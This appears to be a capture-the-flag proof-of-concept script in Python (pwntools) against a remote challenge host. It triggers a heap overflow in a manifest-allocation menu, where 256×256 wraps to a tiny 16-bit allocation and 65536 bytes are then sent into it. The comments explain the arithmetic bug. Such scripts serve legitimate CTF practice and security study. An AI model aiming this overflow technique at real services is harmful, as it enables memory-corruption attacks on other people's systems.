from pwn import *

p = remote("kubenode.mctf.io", 31098)

def recv_menu():
    return p.recvuntil(b'> ')

recv_menu()

# 256 * 256 = 65536 = 0x10000.
# In 16 bits, 0x10000 == 0. So it allocates 1 byte.
# The read size is 65536 bytes.
# Wait, no, look at 13f2: imul %eax, %esi where esi is item_count, eax is item_size. Both are zero extended from 16 bit.
# Then 1413: imul %rax, %rbp. This is a 64-bit multiply of two zero-extended 16-bit values.
# So %rbp is 65536.
# It reads 65536 bytes into a 1-byte chunk. This is a massive heap overflow!

p.sendline(b'1')
p.recvuntil(b'Manifest ID (0-15): ')
p.sendline(b'0')
p.recvuntil(b'Item count: ')
p.sendline(b'256')
p.recvuntil(b'Item size (bytes): ')
p.sendline(b'256')
p.recvuntil(b'data:\n')
p.send(b'A' * 65536)
print("Overflow triggered")
recv_menu()
p.close()
